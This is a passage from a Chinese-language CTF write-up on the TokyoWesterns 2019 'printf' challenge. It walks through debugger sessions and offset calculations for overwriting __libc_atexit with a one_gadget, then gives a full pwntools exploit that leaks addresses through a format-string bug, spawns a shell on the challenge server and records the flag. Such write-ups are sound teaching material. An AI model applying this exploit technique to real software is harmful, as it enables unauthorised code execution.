    [+] Waiting for debugger: Done
    [*] libc.address 0x7f591a884000
    [*] stack 0x7ffcf901e290
    [*] canary 0xb395c502847a3600
    [*] proc_base 0x56346a570000
    [*] one_gadget 0x7f591a966383
    gef➤  search-pattern 0x7f591a966383
    [+] Searching '\x83\x63\x96\x1a\x59\x7f' in memory
    [+] In '[stack]'(0x7ffcf8fff000-0x7ffcf9020000), permission=rw-      0x7ffcf901df00 - 0x7ffcf901df18  →   "\x83\x63\x96\x1a\x59\x7f[...]" 
      0x7ffcf901e0a0 - 0x7ffcf901e0b8  →   "\x83\x63\x96\x1a\x59\x7f[...]" 
    gef➤  p/x 0x7ffcf901e0a0-0x7ffcf901df00
    $1 = 0x1a0
设定偏移量为0x1000
    pl = "%{}x{}".format(4096, p64(one_gadget))
    s.ru("comment?")
    s.sl(pl)
明显看到`one_gadget`往上了0x1000的偏移量进行写入，由于libc位于stack的上方，通过计算合适的偏移量便可用`one_gadget`覆盖`__libc_atexit`
    [+] Waiting for debugger: Done
    [*] libc.address 0x7f7142fcd000
    [*] stack 0x7ffdb96518f0
    [*] canary 0xeec90b90217bf000
    [*] proc_base 0x5573ff19b000
    [*] one_gadget 0x7f71430af383
    gef➤  search-pattern 0x7f71430af383
    [+] Searching '\x83\xf3\x0a\x43\x71\x7f' in memory
    [+] In '[stack]'(0x7ffdb9632000-0x7ffdb9653000), permission=rw-      0x7ffdb9650570 - 0x7ffdb9650588  →   "\x83\xf3\x0a\x43\x71\x7f[...]" 
      0x7ffdb9651706 - 0x7ffdb965171e  →   "\x83\xf3\x0a\x43\x71\x7f[...]" 
    gef➤  p/x 0x7ffdb9651706-0x7ffdb9650570
    $1 = 0x1196
当调用完`__libc_start_main`程序准备退出之时，跟进到libc的`exit`函数调用`__libc_atexit`处
    ───────────────────────────── code:x86:64 ────
       0x7f624efde38c                  shr    rax, 0x3
       0x7f624efde390                  lea    r12, [rbx+rax*8+0x8]
       0x7f624efde395                  nop    DWORD PTR [rax]
     → 0x7f624efde398                  call   QWORD PTR [rbx]
       0x7f624efde39a                  add    rbx, 0x8
       0x7f624efde39e                  cmp    rbx, r12
       0x7f624efde3a1                  jne    0x7f624efde398
       0x7f624efde3a3                  mov    edi, ebp
       0x7f624efde3a5                  call   0x7f624f0788f0 
    ────────────────────────────────────────────────────────────────── arguments (guessed) ────
    *[rbx] (
       $rdi = 0x00007f624f1af968 → 0x0000000000000000,
       $rsi = 0x0000000000000001,
       $rdx = 0x0000000000000000,
       $rcx = 0x0000000000000000
    )
可以在IDA里看到该处的代码
    LABEL_42:
              if ( v19 )
              {
                v18 = &off_1E66C8;
                if ( &off_1E66C8 > 3) + 1 );
                }
              }
              exit(status);
            }
            sub_12BDB0(dword_1EA108);
            goto LABEL_42;
查看rbx的值，目标就是将0x7f7adebb46c8地址的值覆盖成one_gadget
    ─────────────────────────────── registers ────
    $rax   : 0x0               
    $rbx   : 0x00007f624f17d6c8  →  0x00007f624f079383  →   mov rsi, rcx
    $rcx   : 0x0               
    $rdx   : 0x0               
    $rsp   : 0x00007ffd3f489360  →  0x20786c2520786c25 ("%lx %lx "?)
    $rbp   : 0x0               
    $rsi   : 0x1               
    $rdi   : 0x00007f624f1af968  →  0x0000000000000000
    $rip   : 0x00007f624efde398  →   call QWORD PTR [rbx]
    $r8    : 0x2               
    $r9    : 0x00007f624f183580  →  0x00007f624f183580  →  [loop detected]
    $r10   : 0x00007ffd3f489224  →  0x0000000000000001
    $r11   : 0x2               
    $r12   : 0x00007f624f17d6d0  →  0x0000000000000000
    $r13   : 0x1               
    $r14   : 0x00007f624f181108  →  0x0000000000000000
    $r15   : 0x0               
    $eflags: [CARRY PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
来算算到达该地址所需要的偏移，这里的`0x9af030ba40`便是偏移量
    [+] Waiting for debugger: Done
    [*] libc.address 0x7f624ef97000
    [*] stack 0x7ffd3f489490
    [*] canary 0x3a05dd79a9ba500
    [*] proc_base 0x55a3c78fa000
    [*] one_gadget 0x7f624f079383
    [*] atexit_stack_diff 0x9af030ba40
    gef➤  vmmap libc
    Start              End                Offset             Perm Path
    0x00007f624ef97000 0x00007f624efbc000 0x0000000000000000 r-- /root/workspace/elf/TokyoWesterns_CTF_2019/pwn/printf/libc.so.6
    0x00007f624efbc000 0x00007f624f12f000 0x0000000000025000 r-x /root/workspace/elf/TokyoWesterns_CTF_2019/pwn/printf/libc.so.6
    0x00007f624f12f000 0x00007f624f178000 0x0000000000198000 r-- /root/workspace/elf/TokyoWesterns_CTF_2019/pwn/printf/libc.so.6
    0x00007f624f178000 0x00007f624f17b000 0x00000000001e0000 r-- /root/workspace/elf/TokyoWesterns_CTF_2019/pwn/printf/libc.so.6
    0x00007f624f17b000 0x00007f624f17e000 0x00000000001e3000 rw- /root/workspace/elf/TokyoWesterns_CTF_2019/pwn/printf/libc.so.6
    gef➤  p/x 0x00007f624f17d6c8-0x00007f624ef97000
    $1 = 0x1e66c8
    gef➤  p/x 0x7f624efde398-0x00007f624ef97000
    $2 = 0x47398
    gef➤  p/x 0x7ffd3f489490-(0x00007f624ef97000+0x1e66c8)-0x390
    $3 = 0x9af030ba38
    gef➤  p/x 0x7ffd3f489490-(0x00007f624ef97000+0x1e66c8)-0x390+8
    $4 = 0x9af030ba40
`0x1e66c8`是`__libc_atexit`相对于libc基址的偏移，可以在IDA找到该结构
    __libc_atexit:00000000001E66C8 __libc_atexit   segment para public 'DATA' use64
    __libc_atexit:00000000001E66C8                 assume cs:__libc_atexit
    __libc_atexit:00000000001E66C8                 ;org 1E66C8h
    __libc_atexit:00000000001E66C8 off_1E66C8      dq offset fcloseall_0   ; DATA XREF: sub_47170+1FF↑o
    __libc_atexit:00000000001E66C8                                         ; sub_5C960+1BFA↑o ...
    __libc_atexit:00000000001E66C8 __libc_atexit   ends
`0x390`是栈内地址偏移
    [+] Waiting for debugger: Done
    [*] libc.address 0x7f2e14154000
    [*] stack 0x7ffc707793c0
    [*] canary 0x6ad3921cfee82500
    [*] proc_base 0x55fcbd744000
    gef➤  search-pattern 0x7f2e14236383
    [+] Searching '\x83\x63\x23\x14\x2e\x7f' in memory
    [+] In '[stack]'(0x7ffc7075a000-0x7ffc7077b000), permission=rw-      0x7ffc70779030 - 0x7ffc70779048  →   "\x83\x63\x23\x14\x2e\x7f[...]" 
      0x7ffc707791d0 - 0x7ffc707791e8  →   "\x83\x63\x23\x14\x2e\x7f[...]" 
    gef➤  p/x 0x7ffc707793c0-0x7ffc70779030
    $1 = 0x390
覆盖`__libc_atexit`为`one_gadget`地址  
## 0x05 get shell~
完整的EXP
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    import os, sys
    # Setting at first
    DEBUG = 3
    LIBCV = 2.19
    context.arch = "amd64"
    #context.log_level = "debug"
    elf = ELF("./printf",checksec=False)
    # synonyms for faster typing
    tube.s = tube.send
    tube.sl = tube.sendline
    tube.sa = tube.sendafter
    tube.sla = tube.sendlineafter
    tube.r = tube.recv
    tube.ru = tube.recvuntil
    tube.rl = tube.recvline
    tube.ra = tube.recvall
    tube.rr = tube.recvregex
    tube.irt = tube.interactive
    if DEBUG == 1:
        if context.arch == "i386":
            libc = ELF("/lib/i386-linux-gnu/libc.so.6",checksec=False)
        elif context.arch == "amd64":
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
        s = process("./printf")
    elif DEBUG == 2:
        if context.arch == "i386":
            libc = ELF("/root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x86/libc.so.6",checksec=False)
            os.system("patchelf --set-interpreter /root/toolchain/elf/glibc/x86/glibc-"+str(LIBCV)+"/x86/ld-linux-x86-64.so.2 printf")
            os.system("patchelf --set-rpath /root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x86:/libc.so.6 printf")
        elif context.arch == "amd64":
            #libc = ELF("/root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x64/libc.so.6",checksec=False)
            #os.system("patchelf --set-interpreter /root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x64/ld-linux-x86-64.so.2 printf")
            #os.system("patchelf --set-rpath /root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x64:/libc.so.6 printf")
            libc = ELF("./libc.so.6")
            os.system("patchelf --set-interpreter /root/workspace/elf/ld-linux-x86-64-b6d3f5f70ba36f736a596a01829be4d619e373b4167b513d634c044ac7d74b94.so.2 printf")
            os.system("patchelf --set-rpath /root/workspace/elf:/libc.so.6 printf")
        s = process("./printf")
    elif DEBUG == 3:
        libc = ELF("./libc.so.6",checksec=False)
        ip = "printf.chal.ctf.westerns.tokyo" 
        port = 10001
        s = remote(ip,port)
    def clean():
        s.close()
        if DEBUG == 2:
            if context.arch == "i386":
                os.system("patchelf --set-interpreter /lib/ld-linux.so.2 printf")
                os.system("patchelf --set-rpath /lib/i386-linux-gnu:/libc.so.6 printf")
            if context.arch == "amd64":
                os.system("patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 printf")
                os.system("patchelf --set-rpath /lib/x86_64-linux-gnu:/libc.so.6 printf")
    def pwn():
        #zx(0x130B)
        #pause()
        pl = "%lx "*((0x100-4)/4)#64
        s.sla("What's your name?", pl)
        s.ru("Hi, \n")
        leak = s.ru("Do").split(" ")
        libc.address = int(leak[2],16) - 0x10d024
        stack = int(leak[39],16)
        canary = int(leak[40],16)
        proc_base = int(leak[41],16) - 0x2a40
        one_gadget = libc.address + 0xe2383
        info("libc.address 0x%x", libc.address)
        info("stack 0x%x", stack)
        info("canary 0x%x", canary)
        info("proc_base 0x%x", proc_base)
        info("one_gadget 0x%x", one_gadget)
        atexit_stack_diff = stack - (libc.address + 0x1e66c8) - 0x390 + 8
        info("atexit_stack_diff 0x%x", atexit_stack_diff)
        pl = "%{}x{}".format(atexit_stack_diff, p64(one_gadget))
        s.ru("comment?")
        s.sl(pl)
        s.irt()
        #clean()
        # TWCTF{Pudding_Pudding_Pudding_purintoehu}
    if __name__ == "__main__":
        pwn()
pwn~